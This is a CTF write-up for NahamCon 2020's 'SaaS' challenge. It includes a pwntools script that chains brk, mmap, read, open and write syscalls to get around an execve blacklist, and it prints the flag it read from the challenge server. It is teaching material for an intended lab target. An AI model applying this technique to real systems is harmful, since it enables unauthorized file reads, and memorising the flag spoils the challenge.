# NahamCon CTF 2020

## SaaS

> 100
>
> You've heard of software as a service, but have you heard of syscall as a service?
>
> Connect here:</br>
> `nc jh2i.com 50016`</br>
>
> [`saas`](saas)

Tags: _pwn_ _x86-64_ _syscall_


## Summary

A syscall trainer with a blacklist.

> If I were a 12-year-old, on pandemic lockdown, I'd be playing with this _all... day... long..._
> 
> Yes, one could do all of this in C or assembly (better), but for casual learning, this is pretty neat.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.


### Decompile with Ghidra

> After a quick scan of the decompiled code I could not find any obvious vulnerability. The intent of this challenge is to obtain the flag by sending syscalls (if there are unintended solutions, great!; I look forward to the write-ups).

The constraints for this challenge are located in the function `blacklist`:

```c
  local_48[0] = 59;
  local_48[1] = 57;
  local_48[2] = 56;
  local_48[3] = 62;
  local_48[4] = 101;
  local_48[5] = 200;
  local_48[6] = 322;
```

First on the blacklist is fan favorite `execve`--no easy shell for you.


### Take it for a test run

```
Welcome to syscall-as-a-service!

Enter rax (decimal): 12
Enter rdi (decimal): 4096
Enter rsi (decimal): 0
Enter rdx (decimal): 0
Enter r10 (decimal): 0
Enter r9 (decimal): 0
Enter r8 (decimal): 0
Rax: 0x55b7ef168000

Enter rax (decimal):
```

Cool!  Got heap.

```
Sorry too slow try scripting your solution.
```

Not so cool.  Kinda lame actually, _how's a kid to learn?_

Let's patch out that pesky alarm:

```
#!/usr/bin/python3

from pwn import *

binary = ELF('saas')
binary.asm(binary.symbols['alarm'], 'ret')
binary.save('saas_noalarm')
os.chmod('saas_noalarm',0o755)
```

Right, now, just take your time with your favorite [syscall reference](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) and craft a solve.  Oh, and make liberal use of `man`.



## Solve

### Setup

```python
#!/usr/bin/python3

from pwn import *

def syscall(p,rax=0,rdi=0,rsi=0,rdx=0,r10=0,r9=0,r8=0,stdin=''):
    p.sendlineafter('Enter rax (decimal):', str(rax))
    p.sendlineafter('Enter rdi (decimal):', str(rdi))
    p.sendlineafter('Enter rsi (decimal):', str(rsi))
    p.sendlineafter('Enter rdx (decimal):', str(rdx))
    p.sendlineafter('Enter r10 (decimal):', str(r10))
    p.sendlineafter('Enter r9 (decimal):' , str(r9))
    p.sendlineafter('Enter r8 (decimal):' , str(r8))

    if len(stdin) > 0:
        print('stdin',stdin)
        p.sendline(stdin)

    stdout = p.recvuntil('Rax: ')
    if len(stdout.split(b'Rax: ')[0][1:]) > 1:
        print('stdout',stdout.split(b'Rax: ')[0][1:])

    return int(p.recvline().strip(),16)


#p = process('./saas_noalarm')
p = remote('jh2i.com', 50016)
```

This `syscall` function just frontends the challenge and adds support for stdin/stdout.  Returned is RAX (the return of the _real_ syscall).

From here you are only limited by your imagination.


### Find the heap (brk)

```python
# brk
heap = syscall(p,12,0x0)
print('heap',hex(heap))
```

Using the heap as a scratchpad.

> I'm not going to detail how each syscall works, please read the relevant syscall man page.


### Allocate some RAM for a filename

```python
# mmap
filename = syscall(p,9,heap,0x1000,7,50,0,0)
print('filename',hex(filename))
```

Using the `heap` pointer returned from `brk`, use `mmap` to request a page of RAM.


### From stdin read in the name of the flag file

```
# read
flagfile = b'./flag.txt\x00'
length = syscall(p,0,0,filename,len(flagfile),stdin=flagfile)
print('length',hex(length))
assert(length == len(flagfile))
```

CTFs are usually pretty consistent, since the other challenges had the flag located in the same directory as the working directory of the running binary, I just assumed `./flag.txt`.

The `syscall` Python function above will send the name of the flag file after invoking the `read` system call and will store the input at the address `filename` returned from `mmap` above.

The `assert` just checks that `read` really did _read_ in all the bytes.


### Open the file

```
# open
fd = syscall(p,2,filename)
print('fd',hex(fd))
```

`open` the file reference by `filename` (from `mmap` and populated with `read`) and return a file descriptor.


### Allocate a buffer for the file contents

```
# mmap
buf = syscall(p,9,heap+0x1000,0x1000,7,50,0,0)
print('buf',hex(buf))
```

Just like the previous `mmap`, but with an offset added to the `heap` address.  Now imagine if you get this wrong all the heap bugs one can create. :-)

> Ok, this is probably wasteful.  I already have 4096 bytes from the last `mmap`, and the known number of bytes used (the `length` returned from `read`).  I could have just used an offset and pretended this was a struct.


### Read the flag

```
# read
bytesread = syscall(p,0,fd,buf,100)
print('bytesread',hex(bytesread))
```

This `read` is not unlike the previous read, however instead of using `stdin` (`0`), we'll read from the file descriptor `fd` returned from `open` and store in the newly allocated `buf`.


### Write to stdout

```
# write
bytessent = syscall(p,1,1,buf,bytesread)
print('bytessent',hex(bytessent))
assert(bytessent == bytesread)
```

Finally, `write` `buf` to `stdout`.

Output:

```
# ./solve.py
[+] Opening connection to jh2i.com on port 50016: Done
heap 0x560b54839000
filename 0x560b54839000
stdin b'./flag.txt\x00'
length 0xb
fd 0x6
buf 0x560b5483a000
bytesread 0x1f
stdout b'flag{rax_rdi_rsi_radical_dude}\n'
bytessent 0x1f
```

> Missing is any error checking, i.e. `-1` (`0xffffffffffffffff`) on fail.

